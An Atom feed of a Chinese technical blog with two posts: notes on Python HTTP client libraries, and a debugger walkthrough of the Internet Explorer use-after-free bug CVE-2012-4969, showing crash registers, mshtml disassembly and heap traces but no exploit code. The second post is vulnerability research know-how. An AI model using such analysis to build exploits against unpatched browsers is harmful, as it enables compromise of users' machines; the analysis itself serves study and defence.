<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[骆驼的乌托邦]]></title>
  
  <link href="/atom.xml" rel="self"/>
  <link href="https://github.com/liteway/liteway.github.io/"/>
  <updated>2015-08-08T08:42:28.000Z</updated>
  <id>https://github.com/liteway/liteway.github.io/</id>
  
  <author>
    <name><![CDATA[liteway]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[Python HTTP Client Lib]]></title>
    <link href="https://github.com/liteway/liteway.github.io/2015/06/20/py_httpclient/"/>
    <id>https://github.com/liteway/liteway.github.io/2015/06/20/py_httpclient/</id>
    <published>2015-06-20T15:00:00.000Z</published>
    <updated>2015-08-08T08:42:28.000Z</updated>
    <content type="html"><![CDATA[<p>使用Python中的HTTP Client库来爬取网页的访问十分方便，但众多的库可能让使用者感觉杂乱无章，本文总结了Python中几个常见HTTP库的使用方式，以便根据实际需求来选择合适的库。<a id="more"></a></p>
<h2 id="urllib">urllib</h2><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">urllib<span class="built_in">.</span>urlopen(url, <span class="built_in">data</span><span class="subst">=</span><span class="literal">None</span>, proxies<span class="subst">=</span><span class="literal">None</span>) 等于：</span><br><span class="line">    opener <span class="subst">=</span> urllib<span class="built_in">.</span>FancyURLopener(proxies<span class="subst">=</span><span class="literal">None</span>)</span><br><span class="line">    opener<span class="built_in">.</span>open(url, <span class="built_in">data</span><span class="subst">=</span><span class="literal">None</span>)</span><br><span class="line">FancyURLopener继承自URLopener，实现了一些异常处理。</span><br><span class="line">proxies <span class="subst">=</span> &#123;<span class="string">'http'</span>: <span class="string">'http://proxy.example.com:8080/'</span>&#125;</span><br><span class="line"></span><br><span class="line">GET Method:</span><br><span class="line"><span class="keyword">params</span> <span class="subst">=</span> urllib<span class="built_in">.</span>urlencode(&#123;<span class="string">'arg1'</span>: arg1_value, <span class="string">'arg2'</span>: arg2_value&#125;)</span><br><span class="line">f <span class="subst">=</span> urllib<span class="built_in">.</span>urlopen(<span class="string">"http://www.xxx.com/query?%s"</span> <span class="subst">%</span><span class="keyword">params</span>)</span><br><span class="line"></span><br><span class="line">POST Method:</span><br><span class="line"><span class="keyword">params</span> <span class="subst">=</span> urllib<span class="built_in">.</span>urlencode(&#123;<span class="string">'arg1'</span>: arg1_value, <span class="string">'arg2'</span>: arg2_value&#125;)</span><br><span class="line">f <span class="subst">=</span> urllib<span class="built_in">.</span>urlopen(<span class="string">"http://www.xxx.com"</span>, <span class="keyword">params</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">Return</span> Value:</span><br><span class="line">返回值f可以作为类似文件句柄来处理</span><br><span class="line">f<span class="built_in">.</span>read() 获取页面内容</span><br><span class="line">f<span class="built_in">.</span>getcode() 获取HTTP响应码</span><br><span class="line">f<span class="built_in">.</span>getinfo() 获取url的meta信息</span><br><span class="line">f<span class="built_in">.</span>geturl() 获取最终的url，由于urlopen会自动处理重定向，可以与原始url比较来判断是否有Redirect动作</span><br></pre></td></tr></table></figure>
<p>urllib可以使用urlencode来编码发送的数据，但不允许使用自定义的request header。</p>
<h2 id="urllib2">urllib2</h2><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">urllib2.urlopen(url, <span class="type">data</span>=<span class="type">None</span>, timeout=<span class="keyword">default</span>) 等于：</span><br><span class="line">    opener = urllib2.build_opener(*handler) -&gt; urllib2.OpenerDirector()</span><br><span class="line">    opener.open(url, <span class="type">data</span>=<span class="type">None</span>, timeout=<span class="keyword">default</span>)</span><br><span class="line">    or</span><br><span class="line">    opener = urllib2.build_opener(*handler)</span><br><span class="line">    urllib2.install_opener(opener) #将修改默认的opener全局变量</span><br><span class="line">    urllib2.open(url, <span class="type">data</span>=<span class="type">None</span>, timeout=<span class="keyword">default</span>)</span><br><span class="line"></span><br><span class="line">可以通过构造Request对象来使用自定义header，例如伪造User-Agent，设置Content-<span class="keyword">Type</span>等；<span class="type">data</span>需要用urllib.urlencode来编码。 </span><br><span class="line">常见的Content-<span class="keyword">Type</span>: application/xml, application/json, application/x-www-<span class="keyword">form</span>-urlencoded(web <span class="keyword">form</span>)</span><br><span class="line">req = urllib2.Request(url, <span class="type">data</span>=<span class="type">None</span>, headers=&#123;&#125;)</span><br><span class="line">f = urllib2.urlopen(req)</span><br><span class="line">返回值与urllib类型一致</span><br><span class="line"></span><br><span class="line"><span class="keyword">Use</span> Proxy:</span><br><span class="line">proxies = &#123;<span class="string">'http'</span>: <span class="string">'http://proxy.example.com:8080/'</span>&#125;</span><br><span class="line">proxy_handler = urllib2.ProxyHandler(proxies=<span class="type">None</span>) #proxies为&#123;&#125;则不设置proxy</span><br><span class="line">opener = urllib2.build_opener(proxy_handler)</span><br><span class="line">urllib2.install_opener(opener)</span><br><span class="line"></span><br><span class="line"><span class="keyword">Use</span> Timeout:</span><br><span class="line">没有设置timeout的接口时，可以通过socket的timeout来设置</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">socket.setdefaulttimeout(seconds)</span><br><span class="line"></span><br><span class="line">Response Code:</span><br><span class="line">通过使用异常机制来获取非<span class="number">200</span>响应码</span><br><span class="line">try:</span><br><span class="line">    response = urllib2.urlopen(url)</span><br><span class="line">except urllib2.HTTPError, e:</span><br><span class="line">    <span class="built_in">print</span> e.code</span><br></pre></td></tr></table></figure>
<p>urllib2允许自定义header，但需要使用urllib.urlencode来编码发送的数据。</p>
<h2 id="httplib">httplib</h2><p>urllib和urllib2都使用了httplib来处理http/https client连接，与http server通信，在python3中该模块重命名为http.client。<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">conn = httplib.HTTPConnection(host, port=None, <span class="keyword">strict</span>=None, timeout=<span class="keyword">default</span>, source_address=None) </span><br><span class="line">*<span class="keyword">strict</span>默认为<span class="keyword">false</span>，为<span class="keyword">True</span>时表示在response中的状态行无法解析时返回BadStatusLine异常；source_address为(host, port)*</span><br><span class="line">conn = httplib.HTTPSConnection(host, port=None, key_file=None, cert_file=None, <span class="keyword">strict</span>=None, timeout=<span class="keyword">default</span>, source_address=None) *使用https连接*</span><br><span class="line"></span><br><span class="line">conn.request(<span class="function"><span class="keyword">method</span>, <span class="title">url</span>, <span class="title">body</span>=<span class="title">None</span>, <span class="title">headers</span>=<span class="comment">&#123;&#125;</span>)</span><br><span class="line">*<span class="title">method</span>通常为'<span class="title">GET</span>','<span class="title">POST</span>','<span class="title">HEAD</span>','<span class="title">PUT</span>','<span class="title">DELETE</span>'；使用<span class="title">POST</span>方式时<span class="title">body</span>为<span class="title">urlencode</span>编码的字符串*</span><br><span class="line"></span><br><span class="line"><span class="title">resp</span> = <span class="title">conn</span>.<span class="title">getresponse</span><span class="params">()</span> *返回<span class="title">HTTPResponse</span>对象*</span><br><span class="line"><span class="title">resp</span>.<span class="title">read</span><span class="params">()</span> *返回<span class="title">response</span> <span class="title">body</span>*</span><br><span class="line"><span class="title">resp</span>.<span class="title">getheaders</span><span class="params">()</span> *以列表的形式返回所有的<span class="title">response</span> <span class="title">header</span>*</span><br><span class="line"><span class="title">resp</span>.<span class="title">getheader</span><span class="params">(name[, <span class="keyword">default</span>])</span> *返回指定的<span class="title">response</span> <span class="title">header</span>，没有则返回<span class="title">default</span>*</span><br><span class="line"><span class="title">resp</span>.<span class="title">status</span>, <span class="title">resp</span>.<span class="title">reason</span> *返回<span class="title">response</span> <span class="title">code</span>和<span class="title">response</span> <span class="title">reason</span>*</span></span><br></pre></td></tr></table></figure></p>
<p>httplib底层利用socket连接到web server，其提供的HTTPSConnection使用ssl模块的socket wrapper。</p>
<h2 id="httplib2">httplib2</h2><p>httplib2为第三方库(a comprehensive HTTP client library)，可以在<a href="https://pypi.python.org/pypi/httplib2" title="httplib2_link" target="_blank" rel="external">这里</a>下载。简单的使用示例如下：<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">h = httplib2.<span class="type">Http</span>(cache=<span class="string">".cache"</span>, timeout=<span class="type">None</span>)</span><br><span class="line">(resp_headers, content) = h.request(url, <span class="keyword">method</span>=<span class="string">"GET"</span>, body=<span class="type">None</span>, headers=<span class="type">None</span>)</span><br></pre></td></tr></table></figure></p>
<h2 id="requests">requests</h2><p>urllib, urllib2是Python标准库中提供的module，通常需要结合使用才能完成一些基本功能，而requests提供了更简单的接口让使用HTTP不再那么复杂，它也正如其宣称的那样——HTTP for Humans，可以在<a href="http://requests-docs-cn.readthedocs.org/zh_CN/latest/index.html" title="requests_doc" target="_blank" rel="external">这里</a>查看官方文档，Package下载<a href="https://pypi.python.org/pypi/requests" title="requests_link" target="_blank" rel="external">地址</a>。</p>
<h3 id="1-_HTTP_Request">1. HTTP Request</h3><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">requests.get/post --&gt; Session.request(method, url, ...)</span><br><span class="line">    --&gt; Session.send(req_obj) --&gt; rsp_obj=XXXAdapter.send(req_obj)</span><br><span class="line"><span class="keyword">*</span>首先根据传入的参数构造Request对象，利用不同的Adapter处理不同的Request，返回相应的Response对象<span class="keyword">*</span></span><br><span class="line"></span><br><span class="line">request(method, url, params=None, data=None, headers=None, cookies=None,</span><br><span class="line">  files=None, auth=None, timeout=None, allow_redirects=True, proxies=None,</span><br><span class="line">  hooks=None, stream=None, verify=None, cert=None)</span><br><span class="line">  <span class="keyword">*</span>params: get方法使用的查询字符串的参数，dict类型<span class="keyword">*</span></span><br><span class="line">  <span class="keyword">*</span>data: post方法发送的body中的数据，dict类型<span class="keyword">*</span></span><br><span class="line">  <span class="keyword">*</span>headers: 自定义HTTP头部信息，dict类型<span class="keyword">*</span></span><br><span class="line">  <span class="keyword">*</span>cookies: 发送的Cookie信息，dict或CookieJar对象<span class="keyword">*</span></span><br><span class="line">  <span class="keyword">*</span>files: 上传multipart encoded文件，文件类对象dict，如&#123;'file': open(fp,<span class="string">"rb"</span>)&#125;<span class="keyword">*</span></span><br><span class="line">  <span class="keyword">*</span>auth: HTTP Auth，tuple类型<span class="keyword">*</span></span><br><span class="line">  <span class="keyword">*</span>timeout: 超时设置秒数，仅用于连接过程，float类型<span class="keyword">*</span></span><br><span class="line">  <span class="keyword">*</span>allow_redirects: 是否允许重定向，默认True<span class="keyword">*</span></span><br><span class="line">  <span class="keyword">*</span>proxies: 代理设置，dict类型<span class="keyword">*</span></span><br><span class="line">  <span class="keyword">*</span>stream: 是否立即下载响应内容，默认False，请求后会立即下载响应体，设置True时只返回header内容，当访问r.content时才开始下载响应体<span class="keyword">*</span></span><br><span class="line">  <span class="keyword">*</span>verify: 是否验证主机SSL证书，默认True<span class="keyword">*</span></span><br><span class="line">  <span class="keyword">*</span>cert: 设置本地client证书<span class="keyword">*</span></span><br><span class="line">所有类型的请求都是通过调用request方法来实现，例如：</span><br><span class="line">r = requests.get(url, <span class="keyword">*</span><span class="keyword">*</span>kwargs) <span class="keyword">*</span>字典中值为None的键不会添加参数<span class="keyword">*</span></span><br><span class="line">r = requests.post(url, data=&#123;&#125;, <span class="keyword">*</span><span class="keyword">*</span>kwargs)</span><br></pre></td></tr></table></figure>
<h3 id="2-_HTTP_Response">2. HTTP Response</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">r<span class="class">.text</span>: unicode编码的response内容，会根据response header中的编码来解码，r.encoding属性可以查看当前编码，并可以指定新的编码，再执行该方法将利用新编码来解析</span><br><span class="line">r<span class="class">.content</span>: 对于非文本请求可以用byte的方式返回内容，会自动解码gzip和deflate</span><br><span class="line">r.<span class="function"><span class="title">json</span><span class="params">()</span></span>: 解码json格式的数据，解析失败会抛出异常</span><br><span class="line">r<span class="class">.raw</span>: 存放原始响应内容，需要设置stream为True，操作文本流可以使用下面的方式：</span><br><span class="line">with <span class="function"><span class="title">open</span><span class="params">(filename, <span class="string">'wb'</span>)</span></span> as fd:</span><br><span class="line">    <span class="keyword">for</span> chunk <span class="keyword">in</span> r.<span class="function"><span class="title">iter_content</span><span class="params">(chunk_size)</span></span>:</span><br><span class="line">        fd.<span class="function"><span class="title">write</span><span class="params">(chunk)</span></span></span><br><span class="line">r<span class="class">.status_code</span>: 响应码</span><br><span class="line">r<span class="class">.reason</span>: 返回响应信息</span><br><span class="line">r<span class="class">.headers</span>: 以dict返回响应头</span><br><span class="line">r<span class="class">.url</span>: 最终的url</span><br><span class="line">r<span class="class">.cookies</span>: 以dict返回所有的cookie </span><br><span class="line">r<span class="class">.history</span>: 返回Response list，可以追踪重定向，按时间顺序从老到新排列</span><br><span class="line">r<span class="class">.request</span>: 返回相应的request对象</span><br></pre></td></tr></table></figure>
]]></content>
    <summary type="html">
    <![CDATA[<p>使用Python中的HTTP Client库来爬取网页的访问十分方便，但众多的库可能让使用者感觉杂乱无章，本文总结了Python中几个常见HTTP库的使用方式，以便根据实际需求来选择合适的库。]]>
    
    </summary>
    
      <category term="python" scheme="https://github.com/liteway/liteway.github.io/tags/python/"/>
    
      <category term="Python" scheme="https://github.com/liteway/liteway.github.io/categories/Python/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[IE UAF漏洞分析之CVE-2012-4969]]></title>
    <link href="https://github.com/liteway/liteway.github.io/2015/04/20/ie_cve_2012_4969/"/>
    <id>https://github.com/liteway/liteway.github.io/2015/04/20/ie_cve_2012_4969/</id>
    <published>2015-04-20T14:00:00.000Z</published>
    <updated>2015-08-08T08:34:56.000Z</updated>
    <content type="html"><![CDATA[<p>UAF(Use After Free)漏洞是众多IE漏洞中最经典的一类，本文将通过分析CVE-2012-4969来揭开UAF的面纱。<a id="more"></a></p>
<h2 id="从crash_dump中分析漏洞原因">从crash dump中分析漏洞原因</h2><p>1) 在windbg中开启IE的Full PageHeap(gflags /i iexplore.exe +hpa)，打开html页面，crash在如下位置：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">eax</span>=<span class="number">00000000</span> <span class="number">ebx</span>=0000001f <span class="number">ecx</span>=073acf30 <span class="number">edx</span>=<span class="number">0000000d</span> <span class="literal">esi</span>=<span class="number">00000000</span> <span class="literal">edi</span>=07898f78 //注意<span class="literal">edi</span>的值</span><br><span class="line"><span class="literal">eip</span>=637d464b <span class="literal">esp</span>=038dbe80 <span class="literal">ebp</span>=038dbe8c iopl=<span class="number">0</span>         nv <span class="preprocessor">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="literal">cs</span>=<span class="number">001b</span>  <span class="literal">ss</span>=<span class="number">0023</span>  <span class="literal">ds</span>=<span class="number">0023</span>  <span class="literal">es</span>=<span class="number">0023</span>  <span class="literal">fs</span>=003b  <span class="literal">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">mshtml!CMshtmlEd::Exec+<span class="number">0x131</span>:</span><br><span class="line">637d464b 8b7f08          <span class="keyword">mov</span>     <span class="literal">edi</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">edi</span>+<span class="number">8</span>] <span class="literal">ds</span>:<span class="number">0023</span>:07898f80=????????</span><br></pre></td></tr></table></figure></p>
<p>2) 从crash点发现edi+8内存中的值无效，往上追踪edi来自于[ebp+8]，即函数CMshtmlEd::Exec的第一个参数(077e6f78)； 而从IDA中看到该函数的声明为__stdcall，该类成员函数的第一个参数可能为this指针，可以推测edi是类CMshtmlEd的一个实例对象。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mshtml!CMshtmlEd::Exec:</span><br><span class="line">637d45bc 8bff            <span class="keyword">mov</span>     <span class="literal">edi</span>,<span class="literal">edi</span></span><br><span class="line">637d45be <span class="number">55</span>              <span class="keyword">push</span>    <span class="literal">ebp</span></span><br><span class="line">637d45bf 8bec            <span class="keyword">mov</span>     <span class="literal">ebp</span>,<span class="literal">esp</span></span><br><span class="line">637d45c1 <span class="number">53</span>              <span class="keyword">push</span>    <span class="number">ebx</span></span><br><span class="line">637d45c2 <span class="number">56</span>              <span class="keyword">push</span>    <span class="literal">esi</span></span><br><span class="line">637d45c3 <span class="number">57</span>              <span class="keyword">push</span>    <span class="literal">edi</span></span><br><span class="line">637d45c4 8b7d08          <span class="keyword">mov</span>     <span class="literal">edi</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">ebp</span>+<span class="number">8</span>] //<span class="literal">edi</span>来自函数第一个参数</span><br></pre></td></tr></table></figure></p>
<p>3) 从crash点往后观察，通过指令序列：[edi] -&gt; eax -&gt; call [eax+8] 可以推测此时的edi为一个未知对象obj_b的地址；从上一条指令：[edi+8] -&gt; edi 可以推测前一个edi应该也是一个未知对象obj_a的地址，而edi+8应该是obj_a中一个成员变量，且该变量等于对象obj_b的地址，即edi+8=&amp;obj_b；<br>再根据2中的推测，可以确定：obj_a=new CMshtmlEd(), obj_b=obj_a-&gt;pObjectB<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">008</span>&gt; u <span class="literal">eip</span></span><br><span class="line">mshtml!CMshtmlEd::Exec+<span class="number">0x131</span>:</span><br><span class="line">637d464b 8b7f08          <span class="keyword">mov</span>     <span class="literal">edi</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">edi</span>+<span class="number">8</span>] //<span class="literal">edi</span>+<span class="number">8</span>中的内容为<span class="literal">edi</span>对象的成员变量</span><br><span class="line">637d464e 8b07            <span class="keyword">mov</span>     <span class="number">eax</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">edi</span>]  //此时<span class="literal">edi</span>为一个对象obj_b的地址，<span class="number">eax</span>即为虚表指针vptr的值</span><br><span class="line">637d4650 <span class="number">57</span>              <span class="keyword">push</span>    <span class="literal">edi</span>                  //obj_b地址作为this指针传入</span><br><span class="line">637d4651 ff5008          <span class="keyword">call</span>    <span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="number">eax</span>+<span class="number">8</span>]    //调用vptr+<span class="number">8</span>处的虚函数</span><br><span class="line">637d4654 8bc6            <span class="keyword">mov</span>     <span class="number">eax</span>,<span class="literal">esi</span></span><br></pre></td></tr></table></figure></p>
<p>4) 观察完crash点附近的上下文后，回过来看看函数mshtml!CMshtmlEd::Exec的第一个参数(CMshtmlEd的this指针)无效，利用!heap命令查看edi所在的堆块的分配释放记录，可以发现其堆内存已经被释放；由此可以确定这是一个UAF问题，CMshtmlEd对象已经被释放，其所在的内存页被设置为PAGE_NOACCESS，而后又在函数CMshtmlEd::Exec中访问该对象的成员，最终导致crash。<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0:008&gt; !heap -p -a edi</span><br><span class="line">    address <span class="number">077e6f78</span> found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 151000</span><br><span class="line">    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)</span><br><span class="line">                                    <span class="number">7599978</span>:          77e6000             2000</span><br><span class="line">    <span class="number">7c927553</span> ntdll!RtlFreeHeap+<span class="number">0x000000</span>f9</span><br><span class="line">    6375bf26 mshtml!CMshtml<span class="number">Ed::</span>Release+<span class="number">0x00000025</span> //堆块已经被释放</span><br><span class="line">    <span class="number">639d53d6</span> mshtml!CHTMLEditor<span class="number">::De</span>leteCommandTarget+<span class="number">0x00000034</span></span><br><span class="line">    <span class="number">639d0d30</span> mshtml!CHTMLEditor<span class="number">::</span>RemoveContainer+<span class="number">0x0000015</span>f</span><br><span class="line">    6385ac12 mshtml!CHTMLEditor<span class="number">::</span>Notify+<span class="number">0x00000026</span></span><br><span class="line">    <span class="number">6361c270</span> mshtml!CHTMLEditorProxy<span class="number">::</span>Notify+<span class="number">0x00000021</span></span><br><span class="line">    6360feb4 mshtml!CDo<span class="number">c::</span>NotifySelection+<span class="number">0x00000059</span></span><br><span class="line">    <span class="number">637e6671</span> mshtml!COmWindowProxy<span class="number">::</span>SwitchMarkup+<span class="number">0x00000347</span></span><br><span class="line">    637525ff mshtml!CDocument<span class="number">::</span>open+<span class="number">0x00000417</span></span><br></pre></td></tr></table></figure></p>
<h2 id="动态追溯UAF对象的生命周期">动态追溯UAF对象的生命周期</h2><p>从UAF对象的生命周期(allocate&amp;use -&gt; release -&gt; reuse)来看，以上已经分析过reuse的地方，现在进一步追溯该对象allocate和release的时机(何时被分配、又是何时被释放)；分析前可以在poc页面中加入一些alert语句作为执行中断点，windbg中首先设置如下几个断点：<br>bp mshtml!CMshtmlEd::CMshtmlEd<br>bp mshtml!CMshtmlEd::~CMshtmlEd<br>bp mshtml!CMshtmlEd::Exec</p>
<p>a) 当执行document.execCommand(“selectAll”)时，会多次断在CMshtmlEd::CMshtmlEd，记录最后一次的位置，edx(CMshtmlEd对象指针)为 07adaf78，此即为allocate的地方；<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">008</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line"><span class="number">eax</span>=07adaf78 <span class="number">ebx</span>=075e8f20 <span class="number">ecx</span>=7c9101bb <span class="number">edx</span>=07adaf78 <span class="literal">esi</span>=<span class="number">00000000</span> <span class="literal">edi</span>=038dbe4c</span><br><span class="line"><span class="literal">eip</span>=6359de45 <span class="literal">esp</span>=038dbe18 <span class="literal">ebp</span>=038dbe30 iopl=<span class="number">0</span>         nv <span class="preprocessor">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="literal">cs</span>=<span class="number">001b</span>  <span class="literal">ss</span>=<span class="number">0023</span>  <span class="literal">ds</span>=<span class="number">0023</span>  <span class="literal">es</span>=<span class="number">0023</span>  <span class="literal">fs</span>=003b  <span class="literal">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">mshtml!CMshtmlEd::CMshtmlEd:</span><br><span class="line">6359de45 8bff            <span class="keyword">mov</span>     <span class="literal">edi</span>,<span class="literal">edi</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">008</span>&gt; u <span class="literal">eip</span></span><br><span class="line">mshtml!CMshtmlEd::CMshtmlEd:</span><br><span class="line">6359de45 8bff            <span class="keyword">mov</span>     <span class="literal">edi</span>,<span class="literal">edi</span></span><br><span class="line">6359de47 <span class="number">55</span>              <span class="keyword">push</span>    <span class="literal">ebp</span></span><br><span class="line">6359de48 8bec            <span class="keyword">mov</span>     <span class="literal">ebp</span>,<span class="literal">esp</span></span><br><span class="line">6359de4a <span class="number">52</span>              <span class="keyword">push</span>    <span class="number">edx</span>         //<span class="number">edx</span>为当前的this指针</span><br><span class="line">6359de4b 8d4a18          <span class="keyword">lea</span>     <span class="number">ecx</span>,[<span class="number">edx</span>+<span class="number">18h</span>]   //<span class="number">edx</span>+<span class="number">18</span>为类CSpringLoader的一个对象指针</span><br><span class="line">6359de4e c702a49e6363    <span class="keyword">mov</span>     <span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="number">edx</span>],offset mshtml!CMshtmlEd::<span class="string">`vftable' (63639ea4) //将vptr写入this指针位置</span><br><span class="line">6359de54 e82f000000      call    mshtml!CSpringLoader::CSpringLoader (6359de88)</span><br><span class="line">6359de59 8b4508          mov     eax,dword ptr [ebp+8]</span></span><br></pre></td></tr></table></figure></p>
<p>继续执行，当断在mshtml!CMshtmlEd::Exec时，第一个参数的值正好是07adaf78，即为use的位置；<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0:008&gt; g</span><br><span class="line">Breakpoint 2 hit</span><br><span class="line">eax=07adaf78 ebx=6361bad0 ecx=63639ea4 edx=<span class="number">00000000</span> esi=075e4ff0 edi=<span class="number">00000000</span></span><br><span class="line">eip=637d45bc esp=038dbe90 ebp=038dbebc iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=<span class="number">00000202</span></span><br><span class="line">mshtml!CMshtml<span class="number">Ed::E</span>xec:</span><br><span class="line">637d45bc 8bff            mov     edi,edi</span><br><span class="line"></span><br><span class="line">0:008&gt; kv</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">038dbe8c <span class="number">637d4387</span> 07adaf78 6361bad<span class="number">0 0000001</span>f mshtml!CMshtml<span class="number">Ed::E</span>xec //第一个参数07adaf78=上面edx的值</span><br><span class="line">038dbebc 637be2fc 6361bad<span class="number">0 0000001</span>f <span class="number">00000002</span> mshtml!CEditRouter<span class="number">::E</span>xecEditCommand+0xd6</span><br><span class="line">038dc<span class="number">278 638</span>afda7 05fe4fc8 6361bad<span class="number">0 0000001</span>f mshtml!CDo<span class="number">c::E</span>xecHelper+0x3c91</span><br><span class="line">038dc<span class="number">298 638</span>ee2a9 05fe4fc8 6361bad<span class="number">0 0000001</span>f mshtml!CDocument<span class="number">::E</span>xec+0x24</span><br><span class="line">038dc<span class="number">2c0 638</span>b167b 040a4ab<span class="number">0 0000001</span>f <span class="number">038d000</span>a mshtml!CBas<span class="number">e::e</span>xecCommand+0x50</span><br><span class="line">038dc<span class="number">2f8 638</span>e<span class="number">7445 00000</span><span class="number">001 040</span>a4ab<span class="number">0 00000000</span> mshtml!CDocument<span class="number">::e</span>xecCommand+0x93</span><br></pre></td></tr></table></figure></p>
